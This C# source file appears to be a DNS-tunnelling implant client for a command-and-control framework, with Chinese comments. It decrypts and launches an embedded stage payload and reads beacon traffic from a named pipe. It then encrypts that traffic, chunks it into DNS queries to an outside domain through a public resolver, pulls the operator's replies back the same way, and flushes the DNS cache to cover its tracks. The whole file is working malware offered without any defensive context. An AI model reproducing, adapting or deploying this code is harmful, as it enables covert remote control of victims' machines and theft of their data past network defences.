using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading.Tasks;
using System.Threading;
using System.Security.Cryptography;
using System.IO;
using System.Reflection;
using System.IO.Pipes;
using System.IO.Compression;
using System.Runtime.InteropServices;

namespace Client
{
    class Program
    {
        private static IPEndPoint remotePoint;
        private static UdpClient udpClient;       
        static void Main(string[] args)
        {
            var assembly = Assembly.GetExecutingAssembly();
            Stream st = assembly.GetManifestResourceStream("Client.Resources.stage.txt");
            byte[] data = new byte[st.Length];
            st.Read(data, 0, data.Length);
            //Console.WriteLine(data.Length);
            SL sL = new SL();
            sL.sc = Encryption.Decrypt(data);
            Thread thread = new Thread(new ThreadStart(sL.LS));
            thread.Start();
            udpClient = new UdpClient(0);
            udpClient.Connect("223.5.5.5", 53);
            udpClient.Client.ReceiveTimeout = 5000;
            remotePoint = new IPEndPoint(IPAddress.Parse("223.5.5.5"), 53);
            TaskFactory fac = new TaskFactory(new LimitedConcurrencyLevelTaskScheduler(10)); //最多用10个线程请求
            List<Task> tasks = new List<Task>();
            byte[] pipeData = Encoding.Default.GetBytes("EDF");
            string domain = "qiqing.cate4cafe.me";

            using (var pipeClient = new NamedPipeClientStream("sxfnb"))
            {
                Thread.Sleep(3000);
                pipeClient.Connect(5000);
                pipeClient.ReadMode = PipeTransmissionMode.Message;
                Console.WriteLine("[+] Connection established succesfully.");
                do
                {
                    try
                    {
                        pipeData = GetDataToPipe(pipeClient);
                    }
                    catch (Exception ex)
                    {
                        Console.WriteLine(ex.ToString());
                    }
                    Console.WriteLine("PIPE读取长度 " + pipeData.Length.ToString());
                    string sendData = Encryption.ByteArrayToHexString(Encryption.Encrypt(pipeData));
                    string md5 = GetMD5Hash(sendData);
                    sendDnsQuestion("md5" + "." + md5 + "." + DateTime.Now.Ticks.ToString()+"."+domain);
                    List<string> sendList = Encryption.SplitLength(sendData);
                    //Console.WriteLine(sendList.Count);
                    int length = sendList.Count / 3; // 一次发送的长度 200+
                    int mod = sendList.Count % 3;
                    int z = 0;
                    for (int i = 0; i < length; i++)
                    {
                        z += 1;
                        string post = "";
                        var l = sendList.GetRange(i * 3, 3);
                        foreach (string s in l)
                        {
                            post += s + ".";
                        }
                        Options.sendData_Queue.Add("post." + z.ToString() + "." + post +  DateTime.Now.Ticks.ToString() + ".qiqing." + domain.Split(new char[] { '.' }, 2)[1]);
                    }
                    if(mod != 0)
                    {
                        z += 1;
                        string aa = "";
                        foreach (string a in sendList.GetRange(length * 3, mod))
                        {
                            aa += a + ".";
                        }
                        Options.sendData_Queue.Add("post." + z.ToString() + "." + aa + DateTime.Now.Ticks.ToString() + ".qiqing." + domain.Split(new char[] { '.' }, 2)[1]);
                    }
                    foreach (string dm in Options.sendData_Queue)
                    {
                        tasks.Add(fac.StartNew(() =>
                        {
                            sendDnsQuestion(dm);
                        }
                        ));
                    }
                    Task.WaitAll(tasks.ToArray());
                    Thread.Sleep(500);
                    Options.sendData_Queue.Clear();
                    sendDnsQuestion("reccount." + DateTime.Now.Ticks.ToString()+ "." + domain); //获取CS返回数据长度来决定要发几次请求
                    tasks.Clear();
                    if (Options.flag)
                    {
                        for (Int32 dataCount = 0; dataCount < Options.dataCount; dataCount++)
                        {
                            Options.request_number.Enqueue(dataCount);
                        }
                        for (int i = 0; i < Options.request_number.Count; i++)
                        {
                            tasks.Add(fac.StartNew(() =>
                            {
                                sendDnsQuestion("get." + Options.request_number.Dequeue().ToString() + "." + DateTime.Now.Ticks.ToString() + "."+ domain);
                                Thread.Sleep(500);
                            }
));
                        }
                        Task.WaitAll(tasks.ToArray());
                    }
                    Options.flag = false;
                    tasks.Clear();
                    //Console.WriteLine("md5  " + GetMD5Hash(Encoding.ASCII.GetString(Options.data)));
                    SendDataToPipe(Options.data,pipeClient);
                    sendDnsQuestion("clear." + DateTime.Now.Ticks.ToString() + "." + domain);
                    FlushMyCache();
                }
                while (true);
            }

        }
        /// <summary>
        /// DNS请求
        /// </summary>
        /// <param name="obj"></param>
        static void sendDnsQuestion(object obj)
        {
            string domain = obj.ToString();
            //Console.WriteLine(domain);
            short Qtype = (Int16)6;
            Console.WriteLine(domain);
            byte[] data = QuestionFrame.Frame(domain, Qtype, (ushort)new Random().Next(1000, 10000));           
            try
            {
                udpClient.Send(data, data.Length);
                byte[] rec = udpClient.Receive(ref remotePoint);
                DnsRespond.respond(rec);
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.Message);
                Console.WriteLine(domain);
                int resend_number = 0;
                try
                {                   
                    while(resend_number < 3)
                    { 
                        Thread.Sleep(3000);
                        udpClient.Connect("223.5.5.5", 53);
                        udpClient.Send(data, data.Length);
                        remotePoint = new IPEndPoint(IPAddress.Parse("223.5.5.5"), 53);
                        byte[] rec = udpClient.Receive(ref remotePoint);
                        DnsRespond.respond(rec);
                        break;
                    }
                }
                catch (Exception e)  //3次重连都失败之后，继续发送心跳包               
                {
                    Console.WriteLine(e.Message);
                    Console.WriteLine(domain);
                    resend_number += 1;
                    ; //发送心跳包
                }
            }
            //catch (IndexOutOfRangeException ie)  //返回数组越界，说明DNS服务器错误，请求已到达。在获取文件时还是得重新发送获取返回
            //{ 
                
            //}
        }

        /// <summary>
        /// AES解密
        /// </summary>
        /// <param name="input"></param>
        /// <returns></returns>

        /// <summary>
        /// 获取管道数据
        /// </summary>
        /// <param name="pipeClient"></param>
        /// <returns></returns>
        private static Byte[] GetDataToPipe(NamedPipeClientStream pipeClient)
        {
            var reader = new BinaryReader(pipeClient);
            var bufferSize = reader.ReadInt32();
            var result = reader.ReadBytes(bufferSize);
            return result;
        }
        /// <summary>
        /// 写管道数据
        /// </summary>
        /// <param name="response"></param>
        /// <param name="pipeClient"></param>
        private static void SendDataToPipe(Byte[] response, NamedPipeClientStream pipeClient)
        {
            BinaryWriter writer = new BinaryWriter(pipeClient);
            writer.Write(response.Length);
            writer.Write(response);

        }
        /// <summary>
        /// 压缩
        /// </summary>
        /// <param name="data"></param>
        /// <returns></returns>
        public static byte[] gzipDecompress(byte[] data)
        {
            try
            {
                MemoryStream ms = new MemoryStream(data);
                GZipStream zip = new GZipStream(ms, CompressionMode.Decompress, true);
                MemoryStream msreader = new MemoryStream();
                byte[] buffer = new byte[0x1000];
                while (true)
                {
                    int reader = zip.Read(buffer, 0, buffer.Length);
                    if (reader <= 0)
                    {
                        break;
                    }
                    msreader.Write(buffer, 0, reader);
                }
                zip.Close();
                ms.Close();
                msreader.Position = 0;
                buffer = msreader.ToArray();
                msreader.Close();
                return buffer;
            }
            catch (Exception e)
            {
                throw new Exception(e.Message);
            }
        }
        /// <summary>
        /// MD5
        /// </summary>
        /// <param name="data"></param>
        /// <returns></returns>
        public static string GetMD5Hash(string data)
        {
            try
            {
                System.Security.Cryptography.MD5 md5 = new System.Security.Cryptography.MD5CryptoServiceProvider();
                byte[] retVal = md5.ComputeHash(Encoding.UTF8.GetBytes(data));
                StringBuilder sBuilder = new StringBuilder();

                // 循环遍历哈希数据的每一个字节并格式化为十六进制字符串
                for (int i = 0; i < retVal.Length; i++)
                {
                    sBuilder.Append(retVal[i].ToString("x2"));
                }
                return sBuilder.ToString();

            }
            catch (Exception ex)
            {
                throw new Exception("GetMD5Hash() fail,error:" + ex.Message);
            }

        }
        [DllImport("dnsapi.dll", EntryPoint = "DnsFlushResolverCache")]
        private static extern UInt32 DnsFlushResolverCache();

        public static void FlushMyCache() //This can be named whatever name you want and is the function you will call
        {
            UInt32 result = DnsFlushResolverCache();
        }
        public class LimitedConcurrencyLevelTaskScheduler : TaskScheduler
        {
            /// <summary>Whether the current thread is processing work items.</summary> 
            [ThreadStatic]
            private static bool _currentThreadIsProcessingItems;
            /// <summary>The list of tasks to be executed.</summary> 
            private readonly LinkedList<Task> _tasks = new LinkedList<Task>(); // protected by lock(_tasks) 
            /// <summary>The maximum concurrency level allowed by this scheduler.</summary> 
            private readonly int _maxDegreeOfParallelism;
            /// <summary>Whether the scheduler is currently processing work items.</summary> 
            private int _delegatesQueuedOrRunning = 0; // protected by lock(_tasks) 

            /// <summary> 
            /// Initializes an instance of the LimitedConcurrencyLevelTaskScheduler class with the 
            /// specified degree of parallelism. 
            /// </summary> 
            /// <param name="maxDegreeOfParallelism">The maximum degree of parallelism provided by this scheduler.</param> 
            public LimitedConcurrencyLevelTaskScheduler(int maxDegreeOfParallelism)
            {
                if (maxDegreeOfParallelism < 1) throw new ArgumentOutOfRangeException("maxDegreeOfParallelism");
                _maxDegreeOfParallelism = maxDegreeOfParallelism;
            }

            /// <summary>
            /// current executing number;
            /// </summary>
            public int CurrentCount { get; set; }

            /// <summary>Queues a task to the scheduler.</summary> 
            /// <param name="task">The task to be queued.</param> 
            protected sealed override void QueueTask(Task task)
            {
                // Add the task to the list of tasks to be processed. If there aren't enough 
                // delegates currently queued or running to process tasks, schedule another. 
                lock (_tasks)
                {
                    // Console.WriteLine("Task Count : {0} ", _tasks.Count);
                    _tasks.AddLast(task);
                    if (_delegatesQueuedOrRunning < _maxDegreeOfParallelism)
                    {
                        ++_delegatesQueuedOrRunning;
                        NotifyThreadPoolOfPendingWork();
                    }
                }
            }
            int executingCount = 0;
            private static object executeLock = new object();
            /// <summary> 
            /// Informs the ThreadPool that there's work to be executed for this scheduler. 
            /// </summary> 
            private void NotifyThreadPoolOfPendingWork()
            {
                ThreadPool.UnsafeQueueUserWorkItem(_ =>
                {
                    // Note that the current thread is now processing work items. 
                    // This is necessary to enable inlining of tasks into this thread. 
                    _currentThreadIsProcessingItems = true;
                    try
                    {
                        // Process all available items in the queue. 
                        while (true)
                        {
                            Task item;
                            lock (_tasks)
                            {
                                // When there are no more items to be processed, 
                                // note that we're done processing, and get out. 
                                if (_tasks.Count == 0)
                                {
                                    --_delegatesQueuedOrRunning;

                                    break;
                                }

                                // Get the next item from the queue 
                                item = _tasks.First.Value;
                                _tasks.RemoveFirst();
                            }


                            // Execute the task we pulled out of the queue 
                            base.TryExecuteTask(item);
                        }
                    }
                    // We're done processing items on the current thread 
                    finally { _currentThreadIsProcessingItems = false; }
                }, null);
            }

            /// <summary>Attempts to execute the specified task on the current thread.</summary> 
            /// <param name="task">The task to be executed.</param> 
            /// <param name="taskWasPreviouslyQueued"></param> 
            /// <returns>Whether the task could be executed on the current thread.</returns> 
            protected sealed override bool TryExecuteTaskInline(Task task, bool taskWasPreviouslyQueued)
            {

                // If this thread isn't already processing a task, we don't support inlining 
                if (!_currentThreadIsProcessingItems) return false;

                // If the task was previously queued, remove it from the queue 
                if (taskWasPreviouslyQueued) TryDequeue(task);

                // Try to run the task. 
                return base.TryExecuteTask(task);
            }

            /// <summary>Attempts to remove a previously scheduled task from the scheduler.</summary> 
            /// <param name="task">The task to be removed.</param> 
            /// <returns>Whether the task could be found and removed.</returns> 
            protected sealed override bool TryDequeue(Task task)
            {
                lock (_tasks) return _tasks.Remove(task);
            }

            /// <summary>Gets the maximum concurrency level supported by this scheduler.</summary> 
            public sealed override int MaximumConcurrencyLevel { get { return _maxDegreeOfParallelism; } }

            /// <summary>Gets an enumerable of the tasks currently scheduled on this scheduler.</summary> 
            /// <returns>An enumerable of the tasks currently scheduled.</returns> 
            protected sealed override IEnumerable<Task> GetScheduledTasks()
            {
                bool lockTaken = false;
                try
                {
                    Monitor.TryEnter(_tasks, ref lockTaken);
                    if (lockTaken) return _tasks.ToArray();
                    else throw new NotSupportedException();
                }
                finally
                {
                    if (lockTaken) Monitor.Exit(_tasks);
                }
            }
        }

    }
}
